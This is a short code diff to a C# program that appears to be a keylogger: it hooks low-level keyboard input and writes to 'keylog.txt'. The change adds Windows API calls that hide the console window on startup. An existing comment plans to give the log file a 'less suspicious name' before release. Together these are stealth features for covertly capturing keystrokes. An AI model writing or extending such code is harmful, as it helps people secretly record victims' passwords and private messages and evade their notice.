@@ -83,6 +83,8 @@ namespace WTKL
 
         private const string TEXT_FILE_NAME = "keylog.txt"; //todo give less suspicious name on final release
 
+        const int SW_HIDE = 0;
+
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool logging = false;
@@ -101,6 +103,10 @@ namespace WTKL
         {
             trayIcon = new NotifyIcon();
             trayMenu = new ContextMenu();
+
+            // hides console, remove if you want to start and stop via console
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
 
             trayMenu.MenuItems.Add("Exit", OnExit);
             trayIcon.Text = "Tray application";
@@ -592,5 +598,11 @@ namespace WTKL
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
